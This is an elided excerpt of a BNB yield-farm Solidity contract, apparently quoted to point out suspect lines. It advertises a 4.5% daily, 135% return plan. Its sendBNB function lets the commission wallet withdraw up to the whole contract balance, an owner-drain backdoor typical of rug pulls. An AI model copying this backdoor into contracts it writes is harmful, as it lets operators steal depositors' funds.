...
contract BASIVIAFARM {
    ...
    /*! anti-whale */
    uint256 constant public MAX_WITHDRAW = 20 ether; // 20 BNB MAX
	...
	constructor(address payable wallet) public {
        ...
        plans.push(Plan(30, 45)); // 30 days 4.5% daily // 135%
	...
	function sendBNB(uint256 amount) public {
		require(msg.sender == commissionWallet, "Must be commission wallet that makes this call");
		require((amount <= balance && amount > 0) , "Amount must be equal to balance and not less than 0");
